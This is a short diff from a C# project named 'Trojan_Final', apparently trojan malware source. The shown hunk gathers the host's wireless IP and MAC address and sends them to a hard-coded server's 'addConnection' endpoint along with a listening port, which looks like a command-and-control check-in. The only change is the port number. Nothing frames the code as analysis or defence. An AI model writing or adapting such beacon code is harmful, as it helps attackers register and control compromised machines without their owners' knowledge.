@@ -64,7 +64,7 @@ namespace Trojan_Final
             var ip = GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault();
             var mac = GetMACAdress();
 
-            var path = "http://192.168.43.183:8087/users/addConnection?ip=" + ip + "&mac=" + mac +"&port=" + 12831.ToString();
+            var path = "http://192.168.43.183:8087/users/addConnection?ip=" + ip + "&mac=" + mac +"&port=" + 12835.ToString();
             HttpResponseMessage response = await client.GetAsync(path);
 
             if (response.IsSuccessStatusCode)
